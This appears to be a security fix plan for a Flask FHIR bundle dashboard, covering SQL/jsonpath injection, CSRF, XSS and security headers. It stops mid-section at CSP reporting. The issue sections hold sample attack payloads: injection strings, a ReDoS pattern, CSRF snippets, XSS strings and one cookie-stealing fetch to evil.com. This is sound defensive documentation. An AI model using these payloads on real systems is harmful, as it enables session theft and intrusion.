# Security Fixes Implementation Plan

**Branch:** `poc-bundle-dashboard`
**Created:** 2026-02-27
**Status:** Implementation Required Before Merge

## Executive Summary

This document provides a comprehensive implementation plan for fixing 8 security vulnerabilities (3 CRITICAL, 5 HIGH) introduced by the OAuth authentication and bundle dashboard features. All issues are new code from this branch and must be addressed before production deployment.

**Vulnerabilities Overview:**

- 3 CRITICAL: SQL Injection, Missing CSRF Protection, XSS
- 5 HIGH: Security Headers, Input Validation, PII Logging, Rate Limiting, Session Fixation

**Estimated Scope:** 8 distinct fixes across 10+ files

---

## Table of Contents

1. [Background & Context](#background--context)
2. [Critical Issues](#critical-issues)
   - [Issue 1: SQL Injection via JSONB Path Query](#issue-1-sql-injection-via-jsonb-path-query)
   - [Issue 2: Missing CSRF Protection](#issue-2-missing-csrf-protection)
   - [Issue 3: XSS via Unsafe onclick Handler](#issue-3-xss-via-unsafe-onclick-handler)
3. [High Severity Issues](#high-severity-issues)
   - [Issue 4: Missing Security Headers](#issue-4-missing-security-headers)
   - [Issue 5: Insufficient Input Validation](#issue-5-insufficient-input-validation)
   - [Issue 6: PII Exposure in Logs](#issue-6-pii-exposure-in-logs)
   - [Issue 7: Missing Rate Limiting on Dashboard Routes](#issue-7-missing-rate-limiting-on-dashboard-routes)
   - [## Issue 8: Session Fixation Vulnerability](#issue-8-session-fixation-vulnerability)
4. [Testing Strategy](#testing-strategy)
5. [Security Best Practices References](#security-best-practices-references)

---

## Background & Context

### Feature Overview

This branch implements:

1. **OAuth 2.0 Authentication** - Using Authlib with PKCE flow for dashboard access
2. **Bundle Dashboard** - Web UI for searching and viewing FHIR bundle diagnostics
3. **Role-Based Access Control** - Restricts dashboard to `hq_user` and `hq_admin` roles

### Security Model

Authentication Flow:

```text
User → /v2/auth/login → OAuth Provider → /v2/auth/callback → Dashboard
```

Authorization:

- Session-based authentication after OAuth callback
- Role verification via Core API (`/v1/account_roles`)
- Fail-closed approach (deny if role fetch fails)

### Current Security Strengths

✅ OAuth 2.0 with PKCE (public client, no client_secret)
✅ Open redirect prevention (`is_safe_redirect_url()`)
✅ Rate limiting on auth endpoints (10/min login, 20/min callback)
✅ Secure session cookies (HttpOnly, Secure, SameSite=Lax)
✅ No OAuth tokens stored in session
✅ SECRET_KEY requirement enforced

### Technology Stack

- **Framework:** Flask 3.x
- **Auth Library:** Authlib (OAuth client)
- **Rate Limiting:** Flask-Limiter (already installed)
- **Database:** PostgreSQL with SQLAlchemy ORM
- **Templates:** Jinja2
- **Session Storage:** Flask sessions (server-side with SECRET_KEY)

---

## Critical Issues

## Issue 1: SQL Injection via JSONB Path Query

### Severity: CRITICAL ⚠️

**OWASP:** A03:2025 Injection
**CWE:** CWE-89 (SQL Injection)

### Vulnerability Description

User-controlled input from the `organization` search parameter is directly interpolated into a PostgreSQL `jsonb_path_exists()` function without sanitization, allowing SQL injection attacks.

### Affected Code

**File:** `app/fhir/service.py`
**Lines:** 287-292
**Function:** `FHIRService.search_bundles()`

```python
if organization:
    query = query.join(Screen, Bundle.id == Screen.bundle_id).filter(
        or_(
            Screen.organization_name.ilike(f'%{organization}%'),  # Safe (parameterized)
            func.jsonb_path_exists(
                Screen.organization_identifiers,
                f'$[*] ? (@.value like_regex "{organization}" flag "i")'  # ❌ VULNERABLE
            )
        )
    ).distinct()
```

### Attack Vectors

Example 1: Regex Injection

```text
?organization=.*")]} || true --
```

Example 2: DoS via Catastrophic Backtracking

```text
?organization=(a+)+$
```

Example 3: Information Disclosure

```text
?organization=") || @.secret_field == "value
```

### Root Cause

The `organization` parameter is inserted directly into the jsonb_path string using f-string interpolation. PostgreSQL's jsonb_path language supports complex expressions, and unescaped user input can break out of the regex context.

### Feasibility Analysis

**Complexity:** Medium
**Breaking Changes:** None
**Dependencies:** Standard library only (`re.escape()`)

**Challenges:**

1. SQLAlchemy's `func.jsonb_path_exists()` doesn't support bind parameters directly
2. Need to escape regex special characters while preserving search functionality
3. Must maintain case-insensitive partial matching behavior

**Solutions Available:**

- Option A: Use `re.escape()` to sanitize regex patterns
- Option B: Switch to simpler JSONB operators (`@>`, `?`)
- Option C: Use SQLAlchemy `text()` with bind parameters

### Implementation Plan

**Recommended Approach:** Option A (regex escaping) + input validation

Step 1: Add Input Sanitization Helper

Create new file: `app/fhir/validators.py`

```python
"""Input validation and sanitization for FHIR routes."""
import re
from typing import Optional


def sanitize_regex_pattern(pattern: str) -> str:
    """Escape special regex characters for safe use in PostgreSQL regex.

    Args:
        pattern: User input to be used in regex

    Returns:
        Escaped pattern safe for regex use

    Example:
        >>> sanitize_regex_pattern("test@example.com")
        'test@example\\.com'
    """
    # Escape all regex special characters
    return re.escape(pattern)


def validate_search_input(
    value: Optional[str],
    max_length: int = 100,
    field_name: str = 'input'
) -> Optional[str]:
    """Validate and sanitize search input.

    Args:
        value: Input value to validate
        max_length: Maximum allowed length
        field_name: Field name for error messages

    Returns:
        Sanitized value or None if empty

    Raises:
        ValueError: If validation fails
    """
    if not value:
        return None

    value = value.strip()

    # Length validation (prevent DoS)
    if len(value) > max_length:
        raise ValueError(
            f'{field_name} exceeds maximum length of {max_length} characters'
        )

    # Escape SQL wildcards to prevent wildcard injection in ILIKE
    # Note: SQLAlchemy parameterizes the value, but wildcards are still interpreted
    value = value.replace('%', '\\%').replace('_', '\\_')

    return value
```

Step 2: Update Service Layer

Modify: `app/fhir/service.py`

```python
# Add import at top
from app.fhir.validators import sanitize_regex_pattern

# In search_bundles() method, replace lines 287-292:
if organization:
    # Sanitize organization input for regex use
    safe_org_pattern = sanitize_regex_pattern(organization)

    query = query.join(Screen, Bundle.id == Screen.bundle_id).filter(
        or_(
            Screen.organization_name.ilike(f'%{organization}%'),
            func.jsonb_path_exists(
                Screen.organization_identifiers,
                f'$[*] ? (@.value like_regex "{safe_org_pattern}" flag "i")'
            )
        )
    ).distinct()
```

Step 3: Add Route-Level Validation

Modify: `app/fhir/routes.py` in `bundle_dashboard_search()` function

```python
# Add import
from app.fhir.validators import validate_search_input

# Replace lines 238-244 with:
try:
    bundle_id = validate_search_input(
        request.args.get('bundle_id', '').strip(),
        max_length=100,
        field_name='Bundle ID'
    )
    organization = validate_search_input(
        request.args.get('organization', '').strip(),
        max_length=200,
        field_name='Organization'
    )
except ValueError as e:
    return render_template(
        'error.html',
        error_message=str(e),
        error_code=400
    ), 400

# Keep other parameters as-is (status, source, dates are safe)
status = request.args.get('status', '')
source = request.args.get('source', '')
date_from = request.args.get('date_from', '')
date_to = request.args.get('date_to', '')
```

### Testing Requirements

**Unit Tests:**

```python
# tests/fhir/test_validators.py
def test_sanitize_regex_pattern_escapes_special_chars():
    assert sanitize_regex_pattern('test.com') == 'test\\.com'
    assert sanitize_regex_pattern('a+b*c?') == 'a\\+b\\*c\\?'

def test_validate_search_input_rejects_long_input():
    with pytest.raises(ValueError):
        validate_search_input('a' * 101, max_length=100)

def test_validate_search_input_escapes_sql_wildcards():
    result = validate_search_input('test%_value')
    assert result == 'test\\%\\_value'
```

**Integration Tests:**

```python
# tests/fhir/test_search_security.py
def test_organization_search_prevents_regex_injection(client, auth_headers):
    # Attempt regex injection
    response = client.get(
        '/v2/bundle/dashboard?organization=.*")]} || true --',
        headers=auth_headers
    )
    assert response.status_code == 200  # Should not error
    # Verify no SQL injection occurred by checking logs

def test_organization_search_prevents_dos_regex(client, auth_headers):
    # Catastrophic backtracking pattern
    response = client.get(
        '/v2/bundle/dashboard?organization=(a+)+$',
        headers=auth_headers
    )
    assert response.status_code == 200
    # Should complete quickly (< 1 second)
```

### Files to Modify

1. **NEW:** `app/fhir/validators.py` - Input validation helpers
2. **MODIFY:** `app/fhir/service.py` - Add regex sanitization
3. **MODIFY:** `app/fhir/routes.py` - Add input validation
4. **NEW:** `tests/fhir/test_validators.py` - Unit tests
5. **NEW:** `tests/fhir/test_search_security.py` - Integration tests

### Verification Steps

1. Run unit tests: `flask test tests/fhir/test_validators.py`
2. Run integration tests: `flask test tests/fhir/test_search_security.py`
3. Manual testing:
   - Search with special characters: `test@example.com`
   - Search with regex patterns: `.*`, `(a+)+`
   - Search with SQL injection attempts: `"); DROP TABLE--`
4. Review application logs for errors
5. Verify search functionality still works for legitimate queries

### References

- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PostgreSQL jsonb_path Documentation](https://www.postgresql.org/docs/current/functions-json.html#FUNCTIONS-SQLJSON-PATH)
- [Python re.escape() Documentation](https://docs.python.org/3/library/re.html#re.escape)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

---

## Issue 2: Missing CSRF Protection

### Severity: CRITICAL ⚠️

**OWASP:** A01:2025 Broken Access Control
**CWE:** CWE-352 (Cross-Site Request Forgery)

### Vulnerability Description

The dashboard uses session-based authentication but lacks CSRF protection. An attacker can craft malicious pages that trick authenticated users into performing unwanted actions (search queries, potentially future POST operations).

### Affected Code

**Files:** All dashboard routes and templates

- `app/fhir/routes.py` - Dashboard routes (GET requests currently, but vulnerable to future POST)
- `app/fhir/templates/*.html` - Forms without CSRF tokens
- `app/auth_routes.py` - Logout route (GET, should be POST with CSRF)

**Current State:**

```python
# No CSRF protection configured
@fhir_bp.route('/bundle/dashboard', methods=['GET'])
@login_required
def bundle_dashboard_search():
    # Processes user input without CSRF validation
    bundle_id = request.args.get('bundle_id', '').strip()
    # ...
```

```html
<!-- search.html - No CSRF token -->
<form method="GET" action="/v2/bundle/dashboard">
    <input type="text" name="bundle_id" />
    <!-- Missing: <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/> -->
</form>
```

### Attack Vectors

Example 1: Malicious Search Query

```html
<!-- Attacker's page -->
<img src="https://your-app.com/v2/bundle/dashboard?bundle_id=malicious&organization=evil" />
```

Example 2: Forced Logout

```html
<img src="https://your-app.com/v2/auth/logout" />
```

Example 3: Future Risk (if POST added)

```html
<form action="https://your-app.com/v2/bundle/delete" method="POST">
    <input type="hidden" name="bundle_id" value="important-bundle" />
</form>
<script>document.forms[0].submit();</script>
```

### Root Cause

1. No Flask-WTF or CSRFProtect configured
2. Session-based authentication without CSRF = vulnerable
3. Logout uses GET instead of POST (should be state-changing POST)

### Feasibility Analysis

**Complexity:** Low-Medium
**Breaking Changes:** Minimal (logout endpoint changes from GET to POST)
**Dependencies:** Flask-WTF (needs to be added to Pipfile)

**Challenges:**

1. Need to add Flask-WTF dependency
2. Must exempt API endpoints (they use different auth)
3. Logout button needs to change from link to form
4. All forms need CSRF token injection

**Solutions Available:**

- Flask-WTF's CSRFProtect (industry standard)
- Manual CSRF token generation (not recommended)

### Implementation Plan

**Recommended Approach:** Flask-WTF CSRFProtect with selective exemptions

Step 1: Add Dependency

Modify: `Pipfile`

```toml
[packages]
# ... existing packages ...
flask-wtf = "*"
```

Run: `pipenv install flask-wtf`

Step 2: Configure CSRF Protection

Modify: `app/extensions.py`

```python
# Add import
from flask_wtf.csrf import CSRFProtect

# Add after limiter definition
csrf = CSRFProtect()

def init_csrf(app):
    """Initialize CSRF protection for dashboard routes.

    Exempts API endpoints that use token-based authentication.
    """
    csrf.init_app(app)

    # Exempt API endpoints (they don't use session auth)
    csrf.exempt('fhir.receive_fhir_bundle')
    csrf.exempt('fhir.receive_self_screen_fhir_bundle')
    csrf.exempt('fhir.get_bundle_details')
    csrf.exempt('fhir.get_job_status')

    # Exempt health checks
    csrf.exempt('health.health')
    csrf.exempt('health.readiness')
    csrf.exempt('health.liveness')

    app.logger.info('CSRF protection initialized')
```

Step 3: Initialize in Application

Modify: `app/app.py`

```python
# Add import
from app.extensions import init_csrf

# In create_app() or main initialization, after init_limiter():
init_csrf(app)
```

Step 4: Update Templates with CSRF Tokens

Modify: `app/fhir/templates/search.html`

```html
<!-- Add CSRF token to search form -->
<form method="GET" action="/v2/bundle/dashboard">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
    <div class="row g-3">
        <!-- existing form fields -->
    </div>
</form>
```

**Note:** For GET requests, Flask-WTF validates CSRF tokens if present but doesn't require them by default. This provides defense-in-depth without breaking existing functionality.

Step 5: Convert Logout to POST

Modify: `app/auth_routes.py`

```python
# Change from GET to POST
@auth_bp.route('/logout', methods=['POST'])
def logout():
    """Clear session and log out."""
    session.clear()
    current_app.logger.info('User logged out')
    return redirect(url_for('fhir.bundle_dashboard_search'))
```

Modify: `app/fhir/templates/search.html` and `detail.html`

```html
<!-- Replace logout link with form -->
{% if user %}
<div class="user-info">
    <span class="text-muted">Logged in as: <strong>{{ user.email }}</strong></span>
    <form method="POST" action="{{ url_for('auth.logout') }}" style="display: inline;">
        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
        <button type="submit" class="btn btn-sm btn-outline-secondary ms-2">Logout</button>
    </form>
</div>
{% endif %}
```

Step 6: Add CSRF Error Handling

Modify: `app/app.py` - Add error handler

```python
from flask_wtf.csrf import CSRFError

@app.errorhandler(CSRFError)
def handle_csrf_error(e):
    """Handle CSRF validation errors."""
    current_app.logger.warning(f'CSRF validation failed: {e.description}')
    return render_template(
        'error.html',
        error_message='Security validation failed. Please try again.',
        error_code=400
    ), 400
```

Step 7: Configure CSRF Settings

Modify: `app/settings.py`

```python
class Config:
    # ... existing config ...

    # CSRF Configuration
    WTF_CSRF_ENABLED = True
    WTF_CSRF_TIME_LIMIT = None  # Use session lifetime instead
    WTF_CSRF_SSL_STRICT = os.getenv('WTF_CSRF_SSL_STRICT', 'True').lower() == 'true'

    # CSRF cookie settings (alternative to session-based)
    # WTF_CSRF_COOKIE_SECURE = SESSION_COOKIE_SECURE
    # WTF_CSRF_COOKIE_HTTPONLY = True
    # WTF_CSRF_COOKIE_SAMESITE = 'Lax'
```

Modify: `.env.example`

```bash
# CSRF Protection (set to False only for local development over HTTP)
WTF_CSRF_SSL_STRICT=False
```

### Testing Requirements

**Unit Tests:**

```python
# tests/auth/test_csrf.py
def test_csrf_token_present_in_dashboard(client, authenticated_session):
    response = client.get('/v2/bundle/dashboard')
    assert b'csrf_token' in response.data

def test_logout_requires_post(client, authenticated_session):
    # GET should fail
    response = client.get('/v2/auth/logout')
    assert response.status_code == 405  # Method Not Allowed

def test_logout_requires_csrf_token(client, authenticated_session):
    # POST without CSRF should fail
    response = client.post('/v2/auth/logout')
    assert response.status_code == 400  # CSRF validation failed

def test_logout_succeeds_with_csrf(client, authenticated_session):
    # Get CSRF token
    response = client.get('/v2/bundle/dashboard')
    csrf_token = extract_csrf_token(response.data)

    # POST with CSRF should succeed
    response = client.post(
        '/v2/auth/logout',
        data={'csrf_token': csrf_token}
    )
    assert response.status_code == 302  # Redirect after logout
```

**Integration Tests:**

```python
# tests/fhir/test_csrf_protection.py
def test_api_endpoints_exempt_from_csrf(client):
    """Verify API endpoints don't require CSRF tokens."""
    response = client.post(
        '/v2/fhir/bundle',
        json={'resourceType': 'Bundle'},
        headers={'Authorization': 'Bearer token'}
    )
    # Should not fail with CSRF error (may fail auth, but not CSRF)
    assert response.status_code != 400 or b'csrf' not in response.data.lower()
```

### Files to Modify

1. **MODIFY:** `Pipfile` - Add flask-wtf dependency
2. **MODIFY:** `app/extensions.py` - Add CSRFProtect configuration
3. **MODIFY:** `app/app.py` - Initialize CSRF and add error handler
4. **MODIFY:** `app/settings.py` - Add CSRF configuration
5. **MODIFY:** `.env.example` - Add CSRF settings
6. **MODIFY:** `app/auth_routes.py` - Change logout to POST
7. **MODIFY:** `app/fhir/templates/search.html` - Add CSRF tokens
8. **MODIFY:** `app/fhir/templates/detail.html` - Add CSRF tokens
9. **NEW:** `tests/auth/test_csrf.py` - CSRF tests

### Verification Steps

1. Install dependency: `pipenv install`
2. Run tests: `flask test tests/auth/test_csrf.py`
3. Manual testing:
   - Load dashboard, verify CSRF token in HTML source
   - Try logout via GET (should fail)
   - Try logout via POST without token (should fail)
   - Try logout via POST with token (should succeed)
   - Verify API endpoints still work without CSRF
4. Test in browser with DevTools Network tab
5. Attempt CSRF attack from external page

### References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Flask-WTF Documentation](https://flask-wtf.readthedocs.io/en/stable/csrf.html)
- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
- [OWASP A01:2025 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

## Issue 3: XSS via Unsafe onclick Handler

### Severity: CRITICAL ⚠️

**OWASP:** A03:2025 Injection (XSS)
**CWE:** CWE-79 (Cross-Site Scripting)

### Vulnerability Description

The search results table uses inline `onclick` handlers with Jinja2 template variables. While Jinja2 auto-escapes HTML context, JavaScript context requires different escaping. Malicious bundle IDs could execute arbitrary JavaScript.

### Affected Code

**File:** `app/fhir/templates/search.html`
**Line:** 82

```html
<tr onclick="window.location='/v2/bundle/dashboard/{{ bundle.bundle_id }}'">
```

### Attack Vectors

Example 1: JavaScript Injection

```javascript
// If bundle_id = "'; alert(document.cookie); '"
<tr onclick="window.location='/v2/bundle/dashboard/'; alert(document.cookie); ''">
```

Example 2: Event Handler Injection

```javascript
// If bundle_id = "' onerror='alert(1)' x='"
<tr onclick="window.location='/v2/bundle/dashboard/' onerror='alert(1)' x=''">
```

Example 3: Data Exfiltration

```javascript
// If bundle_id = "'; fetch('https://evil.com?c='+document.cookie); '"
```

### Root Cause

1. Template variable in JavaScript context (onclick attribute)
2. Jinja2 HTML escaping doesn't protect JavaScript context
3. Direct string concatenation in event handler

### Feasibility Analysis

**Complexity:** Low
**Breaking Changes:** None (UI behavior unchanged)
**Dependencies:** None (pure JavaScript/HTML fix)

**Challenges:**

1. Need to maintain clickable row functionality
2. Must work with pagination and filtering
3. Should be accessible (keyboard navigation)

**Solutions Available:**

- Option A: Use data attributes + event listeners (recommended)
- Option B: Use anchor tags instead of onclick
- Option C: Properly escape JavaScript context (complex, error-prone)

### Implementation Plan

**Recommended Approach:** Option A (data attributes with event delegation)

Step 1: Remove Inline onclick Handler

Modify: `app/fhir/templates/search.html`

Replace lines 82-140 (table body):

```html
<tbody>
    {% for bundle in bundles %}
    <tr class="clickable-row" data-bundle-id="{{ bundle.bundle_id }}">
        <td><code>{{ bundle.bundle_id or 'N/A' }}</code></td>
        <td>
            <span class="badge status-badge status-{{ bundle.status }}">
                {{ bundle.status }}
            </span>
        </td>
        <td>{{ bundle.source }}</td>
        <td>{{ bundle.created_at.strftime('%Y-%m-%d %H:%M') if bundle.created_at else 'N/A' }}</td>
        <td>
            {% if bundle.screens and bundle.screens|length > 0 %}
                {{ bundle.screens[0].organization_name or 'N/A' }}
            {% else %}
                N/A
            {% endif %}
        </td>
        <td>
            {% if bundle.performer_lookup_status %}
                {% if bundle.performer_lookup_status == 'success' %}
                    <span class="badge bg-success">✓</span>
                {% elif bundle.performer_lookup_status == 'missing_ref' %}
                    <span class="badge bg-warning text-dark">⚠</span>
                {% elif bundle.performer_lookup_status == 'invalid_ref' %}
                    <span class="badge bg-danger">✗</span>
                {% elif bundle.performer_lookup_status == 'no_identifiers' %}
                    <span class="badge bg-warning text-dark">⚠</span>
                {% elif bundle.performer_lookup_status == 'no_match' %}
                    <span class="badge bg-secondary">○</span>
                {% endif %}
            {% else %}
                <span class="text-muted">-</span>
            {% endif %}
        </td>
        <td>
            {% set error_count = 0 %}
            {% for attempt in bundle.processing_attempts %}
                {% set error_count = error_count + attempt.errors|length %}
            {% endfor %}
            {% if error_count > 0 %}
                <span class="badge bg-danger">{{ error_count }}</span>
            {% else %}
                <span class="text-muted">0</span>
            {% endif %}
        </td>
        <td>
            {% if bundle.screens %}
                <span class="badge bg-info">{{ bundle.screens|length }}</span>
            {% else %}
                <span class="text-muted">0</span>
            {% endif %}
        </td>
    </tr>
    {% endfor %}
</tbody>
```

Step 2: Add JavaScript Event Listener

Modify: `app/fhir/templates/search.html`

Add to `{% block extra_js %}` section (after `{% endblock content %}`):

```html
{% block extra_js %}
<script>
(function() {
    'use strict';

    // Add click handlers to table rows
    document.addEventListener('DOMContentLoaded', function() {
        const rows = document.querySelectorAll('.clickable-row');

        rows.forEach(function(row) {
            // Make row keyboard accessible
            row.setAttribute('tabindex', '0');
            row.setAttribute('role', 'button');

            // Click handler
            row.addEventListener('click', function(e) {
                // Don't navigate if clicking on a link or button inside the row
                if (e.target.tagName === 'A' || e.target.tagName === 'BUTTON') {
                    return;
                }

                const bundleId = this.dataset.bundleId;
                if (bundleId) {
                    // Use URL encoding for safety
                    window.location.href = '/v2/bundle/dashboard/' + encodeURIComponent(bundleId);
                }
            });

            // Keyboard navigation (Enter or Space)
            row.addEventListener('keydown', function(e) {
                if (e.key === 'Enter' || e.key === ' ') {
                    e.preventDefault();
                    this.click();
                }
            });
        });
    });
})();
</script>
{% endblock %}
```

Step 3: Update CSS for Accessibility

Modify: `app/fhir/templates/base.html`

Add to `<style>` section:

```css
/* Clickable row styles */
.clickable-row {
    cursor: pointer;
    transition: background-color 0.2s;
}

.clickable-row:hover {
    background-color: #f8f9fc !important;
}

.clickable-row:focus {
    outline: 2px solid #4e73df;
    outline-offset: -2px;
}
```

Alternative Approach (Option B): Use Anchor Tags

If you prefer semantic HTML over JavaScript:

```html
<tbody>
    {% for bundle in bundles %}
    <tr>
        <td>
            <a href="{{ url_for('fhir.bundle_dashboard_detail', bundle_id=bundle.bundle_id) }}"
               class="text-decoration-none text-dark">
                <code>{{ bundle.bundle_id or 'N/A' }}</code>
            </a>
        </td>
        <!-- Other cells remain the same -->
    </tr>
    {% endfor %}
</tbody>
```

This approach:

- ✅ No XSS risk (Jinja2 url_for() is safe)
- ✅ Better accessibility (native links)
- ✅ Works without JavaScript
- ❌ Only first column is clickable (not entire row)

### Testing Requirements

**Unit Tests:**

```python
# tests/fhir/test_dashboard_xss.py
def test_bundle_id_with_quotes_does_not_execute_js(client, auth_headers, db_session):
    """Verify malicious bundle IDs don't execute JavaScript."""
    # Create bundle with malicious ID
    bundle = Bundle(
        fingerprint='test-xss',
        bundle_id="'; alert('XSS'); '",
        source='external',
        status='processed',
        bundle_data={'resourceType': 'Bundle'}
    )
    db_session.add(bundle)
    db_session.commit()

    response = client.get('/v2/bundle/dashboard', headers=auth_headers)

    # Verify no inline onclick with unescaped quotes
    assert b"onclick=\"window.location='/v2/bundle/dashboard/'; alert('XSS');" not in response.data

    # Verify data attribute is properly escaped
    assert b'data-bundle-id="&#39;; alert(&#39;XSS&#39;); &#39;"' in response.data or \
           b"data-bundle-id=\"'; alert('XSS'); '\"" in response.data

def test_bundle_id_with_event_handlers_sanitized(client, auth_headers, db_session):
    """Verify event handler injection is prevented."""
    bundle = Bundle(
        fingerprint='test-xss-2',
        bundle_id="' onerror='alert(1)' x='",
        source='external',
        status='processed',
        bundle_data={'resourceType': 'Bundle'}
    )
    db_session.add(bundle)
    db_session.commit()

    response = client.get('/v2/bundle/dashboard', headers=auth_headers)

    # Verify no onerror handler in HTML
    assert b"onerror='alert(1)'" not in response.data
```

**Manual Testing:**

```python
# Create test bundles with malicious IDs
test_cases = [
    "'; alert(document.cookie); '",
    "' onerror='alert(1)' x='",
    "<script>alert('XSS')</script>",
    "javascript:alert(1)",
    "' onload='alert(1)' x='",
]

for malicious_id in test_cases:
    bundle = Bundle(
        fingerprint=f'xss-test-{hash(malicious_id)}',
        bundle_id=malicious_id,
        source='external',
        status='processed',
        bundle_data={'resourceType': 'Bundle'}
    )
    db.session.add(bundle)
db.session.commit()
```

### Files to Modify

1. **MODIFY:** `app/fhir/templates/search.html` - Remove onclick, add data attributes and JavaScript
2. **MODIFY:** `app/fhir/templates/base.html` - Add CSS for clickable rows
3. **NEW:** `tests/fhir/test_dashboard_xss.py` - XSS prevention tests

### Verification Steps

1. Run tests: `flask test tests/fhir/test_dashboard_xss.py`
2. Manual testing:
   - Create bundles with malicious IDs (see test cases above)
   - Load dashboard and verify no JavaScript executes
   - Click on rows and verify navigation works
   - Test keyboard navigation (Tab to row, press Enter)
   - Inspect HTML source for proper escaping
3. Browser DevTools:
   - Check Console for JavaScript errors
   - Verify no inline event handlers in Elements tab
4. Accessibility testing:
   - Test with keyboard only (no mouse)
   - Test with screen reader
   - Verify ARIA attributes

### References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Jinja2 Autoescaping](https://jinja.palletsprojects.com/en/3.1.x/templates/#html-escaping)
- [CWE-79: Cross-Site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [MDN: Event Handler Content Attributes](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes#event_handler_content_attributes)
- [WCAG 2.1: Keyboard Accessible](https://www.w3.org/WAI/WCAG21/Understanding/keyboard)

---

## High Severity Issues

## Issue 4: Missing Security Headers

### Severity: HIGH ⚠️
**OWASP:** A02:2025 Security Misconfiguration
**CWE:** CWE-16 (Configuration)

### Vulnerability Description

The dashboard lacks HTTP security headers that protect against common attacks including XSS, clickjacking, MIME sniffing, and information disclosure.

### Missing Headers

1. **Content-Security-Policy (CSP)** - Prevents XSS, data injection
2. **X-Frame-Options** - Prevents clickjacking
3. **X-Content-Type-Options** - Prevents MIME sniffing
4. **Strict-Transport-Security (HSTS)** - Enforces HTTPS
5. **Referrer-Policy** - Controls referrer information leakage

### Affected Code

**File:** `app/app.py`
**Current State:** No security headers configured

Existing `@app.after_request` handlers (lines 78-97) only handle logging and error marking, not security headers.

### Attack Vectors

**Without CSP:**

- Inline script injection
- Loading malicious external scripts
- Data exfiltration via external requests

**Without X-Frame-Options:**

- Clickjacking attacks (embedding dashboard in iframe)
- UI redressing attacks

**Without X-Content-Type-Options:**

- MIME confusion attacks
- Executing non-executable content

### Feasibility Analysis

**Complexity:** Low
**Breaking Changes:** Potential (if CSP is too strict)
**Dependencies:** None

**Challenges:**

1. CSP must allow Bootstrap CDN and Font Awesome CDN
2. CSP must allow inline styles in templates (or refactor to external CSS)
3. HSTS only applicable in production with HTTPS
4. Must not break existing functionality

### Implementation Plan

Step 1: Add Security Headers Handler

Modify: `app/app.py`

Add after existing `@app.after_request` handlers:

```python
@app.after_request
def set_security_headers(response):
    """Add security headers to all responses.

    Implements OWASP security header recommendations for defense-in-depth.
    """
    # Skip security headers for health checks (they don't need them)
    if request.path.startswith('/health/'):
        return response

    # X-Frame-Options: Prevent clickjacking
    response.headers['X-Frame-Options'] = 'DENY'

    # X-Content-Type-Options: Prevent MIME sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'

    # X-XSS-Protection: Legacy XSS protection (for older browsers)
    response.headers['X-XSS-Protection'] = '1; mode=block'

    # Referrer-Policy: Control referrer information
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'

    # Content-Security-Policy: Only for dashboard pages (HTML responses)
    if request.path.startswith('/v2/bundle/dashboard') and \
       response.content_type and 'text/html' in response.content_type:

        # CSP for dashboard: Allow Bootstrap and Font Awesome CDNs
        csp_directives = [
            "default-src 'self'",
            "script-src 'self' https://cdn.jsdelivr.net",
            "style-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com 'unsafe-inline'",
            "font-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com",
            "img-src 'self' data:",
            "connect-src 'self'",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'",
        ]
        response.headers['Content-Security-Policy'] = '; '.join(csp_directives)

    # Strict-Transport-Security: Only in production with HTTPS
    if app.config.get('SESSION_COOKIE_SECURE'):
        response.headers['Strict-Transport-Security'] = \
            'max-age=31536000; includeSubDomains; preload'

    return response
```

Step 2: Add Configuration

Modify: `app/settings.py`

```python
class Config:
    # ... existing config ...

    # Security Headers Configuration
    SECURITY_HEADERS_ENABLED = os.getenv('SECURITY_HEADERS_ENABLED', 'True').lower() == 'true'
    CSP_REPORT_URI = os.getenv('CSP_REPORT_URI', None)  # Optional: CSP violation reporting
```

Modify: `.env.example`

```bash
# Security Headers
SECURITY_HEADERS_ENABLED=True
# CSP_REPORT_URI=https://your-csp-report-endpoint.com/report
```

Step 3: Refactor Inline Styles (Optional but Recommended)

To remove `'unsafe-inline'` from CSP, move inline styles to external CSS.

Create: `app/static/css/dashboard.css`

```css
/* Dashboard styles */
body {
    background-color: #f8f9fc;
}

.navbar-brand {
    font-weight: bold;
}

.status-badge {
    font-size: 0.875rem;
    padding: 0.25rem 0.75rem;
}

.status-processed {
    background-color: #1cc88a;
    color: white;
}

.status-failed {
    background-color: #e74a3b;
    color: white;
}

.status-pending {
    background-color: #f6c23e;
    color: white;
}

.card {
    box-shadow: 0 0.15rem 1.75rem 0 rgba(58, 59, 69, 0.15);
    border: none;
}

.table-hover tbody tr:hover {
    cursor: pointer;
    background-color: #f8f9fc;
}

.clickable-row {
    cursor: pointer;
    transition: background-color 0.2s;
}

.clickable-row:hover {
    background-color: #f8f9fc !important;
}

.clickable-row:focus {
    outline: 2px solid #4e73df;
    outline-offset: -2px;
}
```

Modify: `app/fhir/templates/base.html`

```html
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}Bundle Dashboard{% endblock %}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/dashboard.css') }}">
    {% block extra_css %}{% endblock %}
</head>
```

Then update CSP to remove `'unsafe-inline'`:

```python
"style-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com",
```

Step 4: Add CSP Reporting (Optional)

